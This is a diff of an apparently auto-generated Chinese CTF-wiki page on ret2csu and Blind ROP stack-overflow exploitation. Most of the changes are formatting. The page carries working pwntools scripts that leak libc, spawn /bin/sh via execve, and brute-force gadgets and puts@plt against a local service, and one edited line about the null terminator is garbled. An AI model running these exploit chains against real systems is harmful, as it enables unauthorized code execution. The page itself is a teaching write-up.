@@ -153,7 +153,7 @@
 <li class="toctree-l4"><a class="reference internal" href="#id8">基本介绍</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#id9">攻击条件</a></li>
 <li class="toctree-l4"><a class="reference internal" href="#id10">攻击原理</a></li>
-<li class="toctree-l4"><a class="reference internal" href="#id17">例子</a></li>
+<li class="toctree-l4"><a class="reference internal" href="#id16">例子</a></li>
 </ul>
 </li>
 </ul>
@@ -288,7 +288,7 @@
 <p>这里我们可以利用以下几点</p>
 <ul class="simple">
 <li>从0x000000000040061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器的数据。</li>
-<li>从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi， <strong>但其实此时rdi的高32位寄存器值为0（自行调试）</strong> ，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。</li>
+<li>从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi，<strong>但其实此时rdi的高32位寄存器值为0（自行调试）</strong>，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。</li>
 <li>从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。</li>
 </ul>
 </div>
@@ -326,7 +326,7 @@
 <div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="k">import</span> <span class="n">LibcSearcher</span>
 
-<span class="c1">#context.log_level = &#39;debug&#39;</span>
+<span class="c1">##context.log_level = &#39;debug&#39;</span>
 
 <span class="n">level5</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./level5&#39;</span><span class="p">)</span>
 <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./level5&#39;</span><span class="p">)</span>
@@ -359,8 +359,8 @@
 
 
 <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Hello, World</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="c1"># RDI, RSI, RDX, RCX, R8, R9, more on the stack</span>
-<span class="c1"># write(1,write_got,8)</span>
+<span class="c1">## RDI, RSI, RDX, RCX, R8, R9, more on the stack</span>
+<span class="c1">## write(1,write_got,8)</span>
 <span class="n">csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">write_got</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">write_got</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">)</span>
 
 <span class="n">write_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
@@ -368,16 +368,16 @@
 <span class="n">libc_base</span> <span class="o">=</span> <span class="n">write_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;write&#39;</span><span class="p">)</span>
 <span class="n">execve_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;execve&#39;</span><span class="p">)</span>
 <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;execve_addr &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">execve_addr</span><span class="p">))</span>
-<span class="c1">#gdb.attach(sh)</span>
+<span class="c1">##gdb.attach(sh)</span>
 
-<span class="c1"># read(0,bss_base,16)</span>
-<span class="c1"># read execve_addr and /bin/sh\x00</span>
+<span class="c1">## read(0,bss_base,16)</span>
+<span class="c1">## read execve_addr and /bin/sh\x00</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Hello, World</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
 <span class="n">csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">read_got</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="n">bss_base</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">execve_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
 
 <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Hello, World</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="c1"># execve(bss_base+8)</span>
+<span class="c1">## execve(bss_base+8)</span>
 <span class="n">csu</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">bss_base</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">bss_base</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">)</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div>
@@ -423,7 +423,7 @@
 <li>利用尾部代码控制了rbx，rbp，r12，r13，r14，r15。</li>
 <li>利用中间部分的代码控制了rdx，rsi，edi。</li>
 </ul>
-<p>而其实libc_csu_init的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A是正常的起始地址， <strong>可以看到我们在0x000000000040061f处可以控制rbp寄存器，在0x0000000000400621处可以控制rsi寄存器。</strong> 而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。</p>
+<p>而其实libc_csu_init的尾部通过偏移是可以控制其他寄存器的。其中，0x000000000040061A是正常的起始地址，<strong>可以看到我们在0x000000000040061f处可以控制rbp寄存器，在0x0000000000400621处可以控制rsi寄存器。</strong>而如果想要深入地了解这一部分的内容，就要对汇编指令中的每个字段进行更加透彻地理解。如下。</p>
 <div class="code asm highlight-default"><div class="highlight"><pre><span></span>gef➤  x/5i 0x000000000040061A
    0x40061a &lt;__libc_csu_init+90&gt;:   pop    rbx
    0x40061b &lt;__libc_csu_init+91&gt;:   pop    rbp
@@ -494,8 +494,7 @@ gef➤  x/5i 0x000000000040061A+9
 <h3>原理<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h3>
 <ol class="arabic simple">
 <li>查看溢出函返回时哪个寄存值指向溢出缓冲区空间</li>
-<li>然后反编译二进制，查找call reg 或者jmp reg指令，将
-EIP设置为该指令地址</li>
+<li>然后反编译二进制，查找call reg 或者jmp reg指令，将 EIP设置为该指令地址</li>
 <li>reg所指向的空间上注入Shellcode(需要确保该空间是可以执行的，但通常都是栈上的)</li>
 </ol>
 </div>
@@ -504,8 +503,7 @@ EIP设置为该指令地址</li>
 <h2>BROP<a class="headerlink" href="#brop" title="永久链接至标题">¶</a></h2>
 <div class="section" id="id8">
 <h3>基本介绍<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h3>
-<p>BROP(Blind ROP)于2014年由Standford的Andrea
-Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是 <strong>Hacking Blind</strong> ，下面是作者对应的paper和slides,以及作者相应的介绍</p>
+<p>BROP(Blind ROP)于2014年由Standford的Andrea Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是<strong>Hacking Blind</strong>，下面是作者对应的paper和slides,以及作者相应的介绍</p>
 <ul class="simple">
 <li><a class="reference external" href="http://www.scs.stanford.edu/brop/bittau-brop.pdf">paper</a></li>
 <li><a class="reference external" href="http://www.scs.stanford.edu/brop/bittau-brop-slides.pdf">slide</a></li>
@@ -516,8 +514,8 @@ Bittau提出，其相关研究成果发表在Oakland 2014，其论文题目是 <
 <h3>攻击条件<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h3>
 <ol class="arabic simple">
 <li>源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。</li>
-<li>服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有ASLR保护，但是其只是在程序最初启动的时候有效果）。目前nginx,
-MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。</li>
+<li>服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有ASLR保护，但是其只是在程序最初启动的时候有效果）。目前nginx, MySQL, Apache,
+OpenSSH等服务器应用都是符合这种特性的。</li>
 </ol>
 </div>
 <div class="section" id="id10">
@@ -568,19 +566,14 @@ MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。</li>
 </pre></div>
 </div>
 <p>但通常来说，这样的方法都是比较困难的，因为想要找到一个syscall的地址基本不可能。。。我们可以通过转换为找write的方式来获取。</p>
-<div class="section" id="brop-gadgets">
-<h6>BROP gadgets<a class="headerlink" href="#brop-gadgets" title="永久链接至标题">¶</a></h6>
+<p>BROP gadgets</p>
 <p>首先，在libc_csu_init的结尾一长串的gadgets，我们可以通过偏移来获取write函数调用的前两个参数。正如文中所展示的</p>
 <div class="figure">
 <img alt="" src="../../_images/brop_gadget.png" />
 </div>
-</div>
-<div class="section" id="find-a-call-write">
-<h6>find a call write<a class="headerlink" href="#find-a-call-write" title="永久链接至标题">¶</a></h6>
+<p>find a call write</p>
 <p>我们可以通过plt表来获取write的地址。</p>
-</div>
-<div class="section" id="control-rdx">
-<h6>control rdx<a class="headerlink" href="#control-rdx" title="永久链接至标题">¶</a></h6>
+<p>control rdx</p>
 <p>需要注意的是，rdx只是我们用来输出程序字节长度的变量，只要不为0即可。一般来说程序中的rdx经常性会不是零。但是为了更好地控制程序输出，我们仍然尽量可以控制这个值。但是，在程序</p>
 <div class="code asm highlight-default"><div class="highlight"><pre><span></span><span class="n">pop</span> <span class="n">rdx</span><span class="p">;</span> <span class="n">ret</span>
 </pre></div>
@@ -594,7 +587,6 @@ MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。</li>
 <li>strcmp入口</li>
 </ul>
 </div>
-</div>
 <div class="section" id="gadgets">
 <h5>寻找gadgets<a class="headerlink" href="#gadgets" title="永久链接至标题">¶</a></h5>
 <p>首先，我们来想办法寻找gadgets。此时，由于尚未知道程序具体长什么样，所以我们只能通过简单的控制程序的返回地址为自己设置的值，从而而来猜测相应的gadgets。而当我们控制程序的返回地址时，一般有以下几种情况</p>
@@ -604,21 +596,17 @@ MySQL, Apache, OpenSSH等服务器应用都是符合这种特性的。</li>
 <li>程序一直运行而并不崩溃</li>
 </ul>
 <p>为了寻找合理的gadgets，我们可以分为以下两步</p>
-<div class="section" id="stop-gadgets">
-<h6>寻找stop gadgets<a class="headerlink" href="#stop-gadgets" title="永久链接至标题">¶</a></h6>
-<p>所谓 <code class="docutils literal"><span class="pre">stop</span> <span class="pre">gadget</span></code> <strong>一般</strong> 指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。</p>
+<p>寻找stop gadgets</p>
+<p>所谓<code class="docutils literal"><span class="pre">stop</span> <span class="pre">gadget</span></code>一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。</p>
 <blockquote>
-<div>其实stop
-gadget也并不一定得是上面的样子，其根本的目的在于告诉攻击者，所测试的返回地址是一个gadgets。</div></blockquote>
+<div>其实stop gadget也并不一定得是上面的样子，其根本的目的在于告诉攻击者，所测试的返回地址是一个gadgets。</div></blockquote>
 <p>之所以要寻找stop
-gadgets，是因为当我们猜到某个gadgtes后，如果我们仅仅是将其布置在栈上，由于执行完这个gadget之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会crash。这样的话，在攻击者看来程序只是单纯的crash了。因此，攻击者就会认为在这个过程中并没有执行到任何的 <code class="docutils literal"><span class="pre">useful</span> <span class="pre">gadget</span></code> ，从而放弃它。例子如下图</p>
+gadgets，是因为当我们猜到某个gadgtes后，如果我们仅仅是将其布置在栈上，由于执行完这个gadget之后，程序还会跳到栈上的下一个地址。如果该地址是非法地址，那么程序就会crash。这样的话，在攻击者看来程序只是单纯的crash了。因此，攻击者就会认为在这个过程中并没有执行到任何的<code class="docutils literal"><span class="pre">useful</span> <span class="pre">gadget</span></code>，从而放弃它。例子如下图</p>
 <div class="figure">
 <img alt="" src="../../_images/stop_gadget.png" />
 </div>
-<p>但是，如果我们布置了 <code class="docutils literal"><span class="pre">stop</span> <span class="pre">gadget</span></code> ，那么对于我们所要尝试的每一个地址，如果它是一个gadget的话，那么程序不会崩溃。接下来，就是去想办法识别这些gadget。</p>
-</div>
-<div class="section" id="id14">
-<h6>识别 gadgets<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h6>
+<p>但是，如果我们布置了<code class="docutils literal"><span class="pre">stop</span> <span class="pre">gadget</span></code>，那么对于我们所要尝试的每一个地址，如果它是一个gadget的话，那么程序不会崩溃。接下来，就是去想办法识别这些gadget。</p>
+<p>识别 gadgets</p>
 <p>那么，我们该如何识别这些gadgets呢？我们可以通过栈布局以及程序的行为来进行识别。为了更加容易地进行介绍，这里定义栈上的三种地址</p>
 <ul class="simple">
 <li><strong>Probe</strong></li>
@@ -628,10 +616,10 @@ gadgets，是因为当我们猜到某个gadgtes后，如果我们仅仅是将其
 <li><strong>Trap</strong></li>
 <li>可以导致程序崩溃的地址</li>
 </ul>
-<p>我们可以通过在栈上摆放不同顺序的 <strong>Stop</strong> 与 <strong>Trap</strong> 从而来识别出正在执行的指令。因为执行Stop意味着程序不会崩溃，执行Trap意味着程序会立即崩溃。这里给出几个例子</p>
+<p>我们可以通过在栈上摆放不同顺序的<strong>Stop</strong>与 <strong>Trap</strong>从而来识别出正在执行的指令。因为执行Stop意味着程序不会崩溃，执行Trap意味着程序会立即崩溃。这里给出几个例子</p>
 <ul class="simple">
 <li>probe,stop,traps(traps,traps,…)</li>
-<li>我们通过程序崩溃与否( <strong>如果程序在probe处直接崩溃怎么判断</strong> )可以找到不会对栈进行pop操作的gadget，如<ul>
+<li>我们通过程序崩溃与否(<strong>如果程序在probe处直接崩溃怎么判断</strong>)可以找到不会对栈进行pop操作的gadget，如<ul>
 <li>ret</li>
 <li>xor eax,eax; ret</li>
 </ul>
@@ -644,7 +632,7 @@ gadgets，是因为当我们猜到某个gadgtes后，如果我们仅仅是将其
 </li>
 <li>probe, trap, trap, trap, trap, trap, trap, stop, traps</li>
 <li>我们可以通过这样的布局来找到弹出6个栈变量的gadget，也就是与brop
-gadget相似的gadget。 <strong>这里感觉原文是有问题的，比如说如果遇到了只是pop一个栈变量的地址，其实也是不会崩溃的，，</strong> 这里一般来说会遇到两处比较有意思的地方<ul>
+gadget相似的gadget。<strong>这里感觉原文是有问题的，比如说如果遇到了只是pop一个栈变量的地址，其实也是不会崩溃的，，</strong>这里一般来说会遇到两处比较有意思的地方<ul>
 <li>plt处不会崩，，</li>
 <li>_start处不会崩，相当于程序重新执行。</li>
 </ul>
@@ -653,16 +641,9 @@ gadget相似的gadget。 <strong>这里感觉原文是有问题的，比如说�
 <p>之所以要在每个布局的后面都放上trap，是为了能够识别出，当我们的probe处对应的地址执行的指令跳过了stop，程序立马崩溃的行为。</p>
 <p>但是，即使是这样，我们仍然难以识别出正在执行的gadget到底是在对哪个寄存器进行操作。</p>
 <p>但是，需要注意的是向BROP这样的一下子弹出6个寄存器的gadgets，程序中并不经常出现。所以，如果我们发现了这样的gadgets，那么，有很大的可能性，这个gadgets就是brop
-gadgets。此外，这个gadgets通过错位还可以生成</p>
-<ul class="simple">
-<li>pop rsp</li>
-</ul>
-<p>等这样的gadgets，可以使得程序崩溃也可以作为识别这个gadgets的标志。</p>
-<p><strong>此外，根据我们之前学的ret2libc_csu_init可以知道该地址减去0x1a就会得到其上一个gadgets。可以供我们调用其它函数。</strong></p>
-<p><strong>需要注意的是probe可能是一个stop
-gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为trap地址即可。因为如果是stop
-gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思</strong></p>
-</div>
+gadgets。此外，这个gadgets通过错位还可以生成pop rsp等这样的gadgets，可以使得程序崩溃也可以作为识别这个gadgets的标志。</p>
+<p>此外，根据我们之前学的ret2libc_csu_init可以知道该地址减去0x1a就会得到其上一个gadgets。可以供我们调用其它函数。</p>
+<p>需要注意的是probe可能是一个stop gadget，我们得去检查一下，怎么检查呢？我们只需要让后面所有的内容变为trap地址即可。因为如果是stop gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很有意思.</p>
 </div>
 <div class="section" id="plt">
 <h5>寻找PLT<a class="headerlink" href="#plt" title="永久链接至标题">¶</a></h5>
@@ -688,20 +669,19 @@ gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很�
 <li>strcmp(readable,readable)</li>
 </ul>
 <p>只有最后一种格式，程序才会正常执行。</p>
-<p><strong>注</strong> ：在没有PIE保护的时候，64位程序的ELF文件的0x400000处有7个非零字节。</p>
+<p><strong>注</strong>：在没有PIE保护的时候，64位程序的ELF文件的0x400000处有7个非零字节。</p>
 <p>那么我们该如何具体地去做呢？有一种比较直接的方法就是从头到尾依次扫描每个plt表项，但是这个却比较麻烦。我们可以选择如下的一种方法</p>
 <ul class="simple">
 <li>利用plt表项的慢路径</li>
 <li>并且利用下一个表项的慢路径的地址来覆盖返回地址</li>
 </ul>
 <p>这样，我们就不用来回控制相应的变量了。</p>
-<p>当然，我们也可能碰巧找到 strncmp 或者 strcasecmp 函数，它们具有和 strcmp 一样的效果。</p>
+<p>当然，我们也可能碰巧找到strncmp或者strcasecmp函数，它们具有和strcmp一样的效果。</p>
 </div>
-<div class="section" id="id15">
-<h5>寻找输出函数<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h5>
+<div class="section" id="id14">
+<h5>寻找输出函数<a class="headerlink" href="#id14" title="永久链接至标题">¶</a></h5>
 <p>寻找输出函数既可以寻找write，也可以寻找puts。一般现先找puts函数。不过这里为了介绍方便，先介绍如何寻找write。</p>
-<div class="section" id="write-plt">
-<h6>寻找write&#64;plt<a class="headerlink" href="#write-plt" title="永久链接至标题">¶</a></h6>
+<p>寻找write&#64;plt</p>
 <p>当我们可以控制write函数的三个参数的时候，我们就可以再次遍历所有的plt表，根据write函数将会输出内容来找到对应的函数。需要注意的是，这里有个比较麻烦的地方在于我们需要找到文件描述符的值。一般情况下，我们有两种方法来找到这个值</p>
 <ul class="simple">
 <li>使用rop chain，同时使得每个rop对应的文件描述符不一样</li>
@@ -713,21 +693,16 @@ gadget的话，程序会正常执行，否则就会崩溃。看起来似乎很�
 <li>posix标准每次申请的文件描述符数值总是当前最小可用数值。</li>
 </ul>
 <p>当然，我们也可以选择寻找puts函数。</p>
-</div>
-<div class="section" id="puts-plt">
-<h6>寻找puts&#64;plt<a class="headerlink" href="#puts-plt" title="永久链接至标题">¶</a></h6>
-<p>寻找puts函数(这里我们寻找的是
-plt)，我们自然需要控制rdi参数，在上面，我们已经找到了brop
-gadget。那么，我们根据brop
-gadget偏移9可以得到相应的gadgets（由ret2libc_csu_init中后续可得）。同时在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为 x7fELF。所以我们可以根据这个来进行判断。一般来说，其payload如下</p>
+<p>寻找puts&#64;plt</p>
+<p>寻找puts函数(这里我们寻找的是 plt)，我们自然需要控制rdi参数，在上面，我们已经找到了brop gadget。那么，我们根据brop
+gadget偏移9可以得到相应的gadgets（由ret2libc_csu_init中后续可得）。同时在程序还没有开启PIE保护的情况下，0x400000处为ELF文件的头部，其内容为\x7fELF。所以我们可以根据这个来进行判断。一般来说，其payload如下</p>
 <div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="n">length</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stop_gadget</span><span class="p">)</span>
 </pre></div>
 </div>
 </div>
 </div>
-</div>
-<div class="section" id="id16">
-<h4>攻击总结<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h4>
+<div class="section" id="id15">
+<h4>攻击总结<a class="headerlink" href="#id15" title="永久链接至标题">¶</a></h4>
 <p>此时，攻击者已经可以控制输出函数了，那么攻击者就可以输出.text段更多的内容以便于来找到更多合适gadgets。同时，攻击者还可以找到一些其它函数，如dup2或者execve函数。一般来说，攻击者此时会去做下事情</p>
 <ul class="simple">
 <li>将socket输出重定向到输入输出</li>
@@ -736,11 +711,11 @@ gadget偏移9可以得到相应的gadgets（由ret2libc_csu_init中后续可得�
 </ul>
 </div>
 </div>
-<div class="section" id="id17">
-<h3>例子<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h3>
+<div class="section" id="id16">
+<h3>例子<a class="headerlink" href="#id16" title="永久链接至标题">¶</a></h3>
 <p>这里我们以HCTF2016的出题人失踪了为例，相关的部署文件都放在了example文件夹下的对应目录下。基本思路如下</p>
-<div class="section" id="id18">
-<h4>确定栈溢出长度<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h4>
+<div class="section" id="id17">
+<h4>确定栈溢出长度<a class="headerlink" href="#id17" title="永久链接至标题">¶</a></h4>
 <div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">getbufferflow_length</span><span class="p">():</span>
     <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span>
     <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
@@ -759,11 +734,10 @@ gadget偏移9可以得到相应的gadgets（由ret2libc_csu_init中后续可得�
             <span class="k">return</span> <span class="n">i</span> <span class="o">-</span> <span class="mi">1</span>
 </pre></div>
 </div>
-<p>根据上面，我们可以确定，栈溢出的长度为72。同时，根据回显信息可以发现程序并没有开启canary保护，否则，就会有相应的报错内容。所以我们不需要执行stack
-reading。</p>
+<p>根据上面，我们可以确定，栈溢出的长度为72。同时，根据回显信息可以发现程序并没有开启canary保护，否则，就会有相应的报错内容。所以我们不需要执行stack reading。</p>
 </div>
-<div class="section" id="id19">
-<h4>寻找 stop gadgets<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h4>
+<div class="section" id="stop-gadgets">
+<h4>寻找 stop gadgets<a class="headerlink" href="#stop-gadgets" title="永久链接至标题">¶</a></h4>
 <p>寻找过程如下</p>
 <div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">get_stop_addr</span><span class="p">(</span><span class="n">length</span><span class="p">):</span>
     <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>
@@ -787,11 +761,9 @@ reading。</p>
 </pre></div>
 </div>
 </div>
-<div class="section" id="id20">
-<h4>识别brop gadgets<a class="headerlink" href="#id20" title="永久链接至标题">¶</a></h4>
-<p>下面，我们根据上面介绍的原理来得到对应的brop
-gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop
-gadget，后面的check_brop_gadget是为了检查。</p>
+<div class="section" id="brop-gadgets">
+<h4>识别brop gadgets<a class="headerlink" href="#brop-gadgets" title="永久链接至标题">¶</a></h4>
+<p>下面，我们根据上面介绍的原理来得到对应的brop gadgets地址。构造如下，get_brop_gadget是为了得到可能的brop gadget，后面的check_brop_gadget是为了检查。</p>
 <div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">get_brop_gadget</span><span class="p">(</span><span class="n">length</span><span class="p">,</span> <span class="n">stop_gadget</span><span class="p">,</span> <span class="n">addr</span><span class="p">):</span>
     <span class="k">try</span><span class="p">:</span>
         <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">9999</span><span class="p">)</span>
@@ -825,9 +797,9 @@ gadget，后面的check_brop_gadget是为了检查。</p>
         <span class="k">return</span> <span class="kc">True</span>
 
 
-<span class="c1">#length = getbufferflow_length()</span>
+<span class="c1">##length = getbufferflow_length()</span>
 <span class="n">length</span> <span class="o">=</span> <span class="mi">72</span>
-<span class="c1">#get_stop_addr(length)</span>
+<span class="c1">##get_stop_addr(length)</span>
 <span class="n">stop_gadget</span> <span class="o">=</span> <span class="mh">0x4006b6</span>
 <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400740</span>
 <span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
@@ -842,8 +814,8 @@ gadget，后面的check_brop_gadget是为了检查。</p>
 </div>
 <p>这样，我们基本得到了brop的gadgets地址0x4007ba</p>
 </div>
-<div class="section" id="id21">
-<h4>确定puts&#64;plt地址<a class="headerlink" href="#id21" title="永久链接至标题">¶</a></h4>
+<div class="section" id="puts-plt">
+<h4>确定puts&#64;plt地址<a class="headerlink" href="#puts-plt" title="永久链接至标题">¶</a></h4>
 <p>根据上面，所说我们可以构造如下payload来进行获取</p>
 <div class="code text highlight-default"><div class="highlight"><pre><span></span><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">72</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">stop_gadget</span><span class="p">)</span>
 </pre></div>
@@ -896,14 +868,14 @@ gadget，后面的check_brop_gadget是为了检查。</p>
         <span class="k">return</span> <span class="kc">None</span>
 
 
-<span class="c1">#length = getbufferflow_length()</span>
+<span class="c1">##length = getbufferflow_length()</span>
 <span class="n">length</span> <span class="o">=</span> <span class="mi">72</span>
-<span class="c1">#stop_gadget = get_stop_addr(length)</span>
+<span class="c1">##stop_gadget = get_stop_addr(length)</span>
 <span class="n">stop_gadget</span> <span class="o">=</span> <span class="mh">0x4006b6</span>
-<span class="c1">#brop_gadget = find_brop_gadget(length,stop_gadget)</span>
+<span class="c1">##brop_gadget = find_brop_gadget(length,stop_gadget)</span>
 <span class="n">brop_gadget</span> <span class="o">=</span> <span class="mh">0x4007ba</span>
 <span class="n">rdi_ret</span> <span class="o">=</span> <span class="n">brop_gadget</span> <span class="o">+</span> <span class="mi">9</span>
-<span class="c1">#puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span>
+<span class="c1">##puts_plt = get_puts_plt(length, rdi_ret, stop_gadget)</span>
 <span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x400560</span>
 <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>
 <span class="n">result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
@@ -919,9 +891,9 @@ gadget，后面的check_brop_gadget是为了检查。</p>
     <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
 </pre></div>
 </div>
-<p>最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是“”,那说明我们遇到了 ‘x00’ ，因为puts是输出字符串，字符串是以 ‘x00’ 为终止符的。之后利用ida打开binary模式，首先在edit-&gt;segments-&gt;rebase
+<p>最后，我们将泄露的内容写到文件里。需要注意的是如果泄露出来的是“”,那说明我们遇到了’x`00’为终止符的。之后利用ida打开binary模式，首先在edit-&gt;segments-&gt;rebase
 program 将程序的基地址改为0x400000，然后找到偏移0x560处，如下</p>
-<div class="code text highlight-default"><div class="highlight"><pre><span></span><span class="n">seg000</span><span class="p">:</span><span class="mi">0000000000400560</span>                 <span class="n">db</span> <span class="mi">0</span><span class="n">FFh</span>
+<div class="code asm highlight-default"><div class="highlight"><pre><span></span><span class="n">seg000</span><span class="p">:</span><span class="mi">0000000000400560</span>                 <span class="n">db</span> <span class="mi">0</span><span class="n">FFh</span>
 <span class="n">seg000</span><span class="p">:</span><span class="mi">0000000000400561</span>                 <span class="n">db</span>  <span class="mi">25</span><span class="n">h</span> <span class="p">;</span> <span class="o">%</span>
 <span class="n">seg000</span><span class="p">:</span><span class="mi">0000000000400562</span>                 <span class="n">db</span> <span class="mi">0</span><span class="n">B2h</span> <span class="p">;</span>
 <span class="n">seg000</span><span class="p">:</span><span class="mi">0000000000400563</span>                 <span class="n">db</span>  <span class="mi">0</span><span class="n">Ah</span>
@@ -940,18 +912,18 @@ program 将程序的基地址改为0x400000，然后找到偏移0x560处，如�
 </div>
 <p>这说明，puts&#64;got的地址为0x601018。</p>
 </div>
-<div class="section" id="id22">
